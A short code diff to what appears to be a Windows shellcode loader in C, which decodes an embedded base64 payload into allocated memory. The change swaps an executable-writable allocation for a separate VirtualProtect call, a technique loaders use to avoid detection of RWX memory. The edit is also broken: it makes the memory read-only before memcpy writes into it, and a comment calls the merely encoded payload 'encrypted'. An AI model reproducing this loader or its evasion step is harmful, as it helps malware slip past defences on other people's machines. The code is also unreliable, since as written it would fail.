@@ -79,11 +79,15 @@ int main(void) {
     PBYTE decoded_payload = base64_decode(payload, &decoded_payload_size);
 
     // Allocate memory that has read, write, and execute permission.
-	PBYTE executable_memory = VirtualAlloc(NULL, decoded_payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	PBYTE executable_memory = VirtualAlloc(NULL, decoded_payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (executable_memory == NULL) {
 		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
 		return -1;
 	}
+
+
+    DWORD old_protect = NULL;
+    VirtualProtect(executable_memory, decoded_payload_size, PAGE_EXECUTE_READ, &old_protect);
 
     // Copy the encrypted payload into the allocated memory
 	memcpy(executable_memory, decoded_payload, decoded_payload_size);
